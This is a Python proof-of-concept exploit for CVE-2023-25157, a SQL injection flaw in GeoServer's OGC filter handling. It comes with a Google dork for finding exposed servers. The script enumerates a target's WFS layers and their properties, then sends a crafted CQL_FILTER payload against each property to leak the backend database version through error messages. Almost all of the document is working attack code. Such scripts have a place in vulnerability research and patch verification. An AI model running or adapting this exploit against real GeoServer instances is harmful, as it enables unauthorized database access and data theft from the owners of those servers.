#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Title: GeoServer OGC Filter SQL Injection Vulnerabilities
CVE: CVE-2023-25157
Script Author: Bipin Jitiya (@win3zz)
Date: 06/06/2023
Google Dork: inurl:"/geoserver/ows?service=wfs"
Vendor/Software: https://github.com/geoserver/geoserver
Script Tested on: Ubuntu 20.04.6 LTS with Python 3.8.10
References: 
	1. https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
	2. https://github.com/geoserver/geoserver/commit/145a8af798590288d270b240235e89c8f0b62e1d
	3. https://twitter.com/parzel2/status/1665726454489915395
"""

import requests
import sys
import xml.etree.ElementTree as ET
import json
import urllib3
urllib3.disable_warnings()

# Colored output codes
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BOLD = '\033[1m'
ENDC = '\033[0m'

# Check if the script is run without parameters
if len(sys.argv) == 1:
    print(f"{YELLOW}This script requires a URL parameter.{ENDC}")
    print(f"{YELLOW}Usage: python3 {sys.argv[0]} <URL>{ENDC}")
    sys.exit(1)

# URL and proxy settings
URL = sys.argv[1]
PROXY_ENABLED = True
PROXY = "http://127.0.0.1:8080/" if PROXY_ENABLED else None
PROXYS = "http://127.0.0.1:8080/" if PROXY_ENABLED else None

response = requests.get(URL + "/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities", proxies={"http": PROXY,"https": PROXYS}, verify=False)

if response.status_code == 200:

    # Parse the XML response and extract the Name from each FeatureType and store in a list
    root = ET.fromstring(response.text)
    feature_types = root.findall('.//{http://www.opengis.net/wfs}FeatureType')
    names = [feature_type.findtext('{http://www.opengis.net/wfs}Name') for feature_type in feature_types]
    
    # Print the feature names
    print(f"{GREEN}Available feature names:{ENDC}")
    for name in names:
        print(f"- {name}")

    # Send requests for each feature name and CQL_FILTER type
    cql_filters = ["strStartsWith"] # We can also exploit other filter/functions like "PropertyIsLike", "strEndsWith", "strStartsWith", "FeatureId", "jsonArrayContains", "DWithin" etc.
    for name in names:
        for cql_filter in cql_filters:
            endpoint = f"/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName={name}&maxFeatures=1&outputFormat=json"
            response = requests.get(URL + endpoint, proxies={"http": PROXY,"https": PROXYS}, verify=False)
            if response.status_code == 200:
                json_data = json.loads(response.text)
                properties = json_data['features'][0]['properties']
                property_names = list(properties.keys())
                print(f"\n{GREEN}Available Properties for {name}:{ENDC}")
                for property_name in property_names:
                    print(f"- {property_name}")
                
                print(f"\n{YELLOW}Sending requests for each property name:{ENDC}")
                for property_name in property_names:
                    endpoint = f"/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName={name}&CQL_FILTER={cql_filter}%28{property_name}%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+INTEGER%29%29+--+%27%29+%3D+true"
                    response = requests.get(URL + endpoint, proxies={"http": PROXY,"https": PROXYS}, verify=False)
                    print(f"[+] Sending request for {BOLD}{name}{ENDC} with Property {BOLD}{property_name}{ENDC} and CQL_FILTER: {BOLD}{cql_filter}{ENDC}")
                    if response.status_code == 200:
                        root = ET.fromstring(response.text)
                        error_message = root.findtext('.//{http://www.opengis.net/ogc}ServiceException')
                        print(f"{GREEN}{error_message}{ENDC}")
                    else:
                        print(f"{RED}Request failed{ENDC}")
            else:
                print(f"{RED}Request failed{ENDC}")
else:
    print(f"{RED}Failed to retrieve XML data{ENDC}")